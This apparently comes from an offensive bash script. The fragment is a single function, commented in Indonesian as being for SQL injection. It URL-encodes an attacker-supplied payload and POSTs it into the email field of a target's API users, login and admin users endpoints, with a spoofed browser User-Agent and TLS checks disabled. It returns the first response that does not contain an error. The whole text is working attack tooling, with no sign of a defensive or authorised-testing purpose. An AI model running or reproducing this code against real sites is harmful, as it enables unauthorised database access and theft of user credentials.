# Function untuk SQL injection
sql_inject() {
    local payload="$1"
    
    encoded=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g" | sed 's/--/%2D%2D/g')
    
    endpoints=(
        "$TARGET_URL/api/application/users"
        "$TARGET_URL/auth/login"
        "$TARGET_URL/admin/users"
    )
    
    for endpoint in "${endpoints[@]}"; do
        response=$(curl -s -k -X POST "$endpoint" \
            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "email=test'$encoded&password=test" \
            --max-time 5 2>/dev/null)
        
        if [ -n "$response" ] && [[ "$response" != *"error"* ]]; then
            echo "$response"
            return 0
        fi
    done
    echo ""
}

